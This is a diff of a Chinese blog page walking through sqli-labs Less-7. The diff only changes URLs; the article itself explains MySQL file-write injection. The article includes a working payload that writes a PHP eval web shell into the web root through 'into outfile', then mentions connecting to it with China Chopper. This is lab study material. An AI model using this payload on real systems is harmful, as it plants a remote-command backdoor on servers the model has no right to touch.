@@ -19,27 +19,27 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"chutingting520.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="Mysql文件读写涉及一个配置项secure_file_priv&#x3D;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs7">
-<meta property="og:url" content="http://example.com/2020/11/22/sqli-labs/7/index.html">
+<meta property="og:url" content="https://chutingting520.github.io/2020/11/22/sqli-labs/7/index.html">
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="Mysql文件读写涉及一个配置项secure_file_priv&#x3D;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2020/11/22/sqli-labs/7/7.md/0.png">
-<meta property="og:image" content="http://example.com/2020/11/22/sqli-labs/7/7.md/1.png">
-<meta property="og:image" content="http://example.com/2020/11/22/sqli-labs/7/7.md/2.png">
+<meta property="og:image" content="https://chutingting520.github.io/2020/11/22/sqli-labs/7/0.png">
+<meta property="og:image" content="https://chutingting520.github.io/2020/11/22/sqli-labs/7/1.png">
+<meta property="og:image" content="https://chutingting520.github.io/2020/11/22/sqli-labs/7/2.png">
 <meta property="article:published_time" content="2020-11-22T07:53:57.000Z">
 <meta property="article:modified_time" content="2021-07-27T01:57:10.411Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2020/11/22/sqli-labs/7/7.md/0.png">
+<meta name="twitter:image" content="https://chutingting520.github.io/2020/11/22/sqli-labs/7/0.png">
 
-<link rel="canonical" href="http://example.com/2020/11/22/sqli-labs/7/">
+<link rel="canonical" href="https://chutingting520.github.io/2020/11/22/sqli-labs/7/">
 
 
 <script id="page-configurations">
@@ -196,7 +196,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/22/sqli-labs/7/">
+    <link itemprop="mainEntityOfPage" href="https://chutingting520.github.io/2020/11/22/sqli-labs/7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/cat.jpg">
@@ -267,7 +267,7 @@
 <ul>
 <li>文件读取函数：<br>Load_file(‘文件路径’)</li>
 <li>写文件函数：<br>into outfile<br>into dumpfile</li>
-<li><em>两个函数区别：<br>因为into outfile函数会在行末端写入新行更致命的是会转义换行符，所以利用使用mysql写入dll或者二进制可执行文件，文件可能会被破坏。<br>into dumpfile就能导出一个完整能执行的二进制文件。</em>*<br>条件：<br>1、设置secure_file_priv为Null<br>2、绝对路径<br>3、文件不存在<br>4、有权限<br>尝试注入点，直到?id=1’))–+<br>才出现不同的回显,提示使用outfile语句<br><img src="7.md/0.png"><br>1、secure_file_priv这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。<br>如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；<br>如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；<br>如果这个参数为空，那么导入导出的文件位置将不受限制。<br>打开MySQL目录，在my-ini文件中把secure_file_priv改为空。<br>2、datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径。<br>去第一关查询相对路径，<br><img src="7.md/1.png"><br>注入一句话木马可以了解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a><br>接下来我们注入一句话木马到第七关的目录。<br>into outfile函数(写文件)<br>用法：select ‘写入内容’ into outfile ‘要保存的路径’<br><code>?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot;into outfile &quot;D:/phpstudy_pro/WWW/sqli-labs/Less-7/text.php&quot;--+</code><br><img src="7.md/2.png">成功注入，</li>
+<li><em>两个函数区别：<br>因为into outfile函数会在行末端写入新行更致命的是会转义换行符，所以利用使用mysql写入dll或者二进制可执行文件，文件可能会被破坏。<br>into dumpfile就能导出一个完整能执行的二进制文件。</em>*<br>条件：<br>1、设置secure_file_priv为Null<br>2、绝对路径<br>3、文件不存在<br>4、有权限<br>尝试注入点，直到?id=1’))–+<br>才出现不同的回显,提示使用outfile语句<br><img src="/2020/11/22/sqli-labs/7/0.png"><br>1、secure_file_priv这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。<br>如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；<br>如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；<br>如果这个参数为空，那么导入导出的文件位置将不受限制。<br>打开MySQL目录，在my-ini文件中把secure_file_priv改为空。<br>2、datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径。<br>去第一关查询相对路径，<br><img src="/2020/11/22/sqli-labs/7/1.png"><br>注入一句话木马可以了解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a><br>接下来我们注入一句话木马到第七关的目录。<br>into outfile函数(写文件)<br>用法：select ‘写入内容’ into outfile ‘要保存的路径’<br><code>?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot;into outfile &quot;D:/phpstudy_pro/WWW/sqli-labs/Less-7/text.php&quot;--+</code><br><img src="/2020/11/22/sqli-labs/7/2.png">成功注入，</li>
 <li><ul>
 <li>这里需要使用\ 因为\会被当作转义字符。<br>也可以直接用/  **<br>注入成功后，这边我们用中国菜刀进行连接。</li>
 </ul>
@@ -317,7 +317,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2020/11/22/sqli-labs/7/" title="sqli-labs7">http://example.com/2020/11/22/sqli-labs/7/</a>
+    <a href="https://chutingting520.github.io/2020/11/22/sqli-labs/7/" title="sqli-labs7">https://chutingting520.github.io/2020/11/22/sqli-labs/7/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
